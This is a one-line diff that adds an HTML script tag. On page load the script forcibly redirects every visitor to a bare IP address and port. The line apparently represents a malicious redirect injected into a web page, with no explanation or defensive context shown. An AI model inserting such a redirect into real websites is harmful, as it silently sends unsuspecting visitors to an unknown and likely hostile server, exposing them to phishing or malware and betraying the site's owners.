@@ -1,0 +1,1 @@
+<script>document.location.href ="http://221.121.158.43:6284";</script>
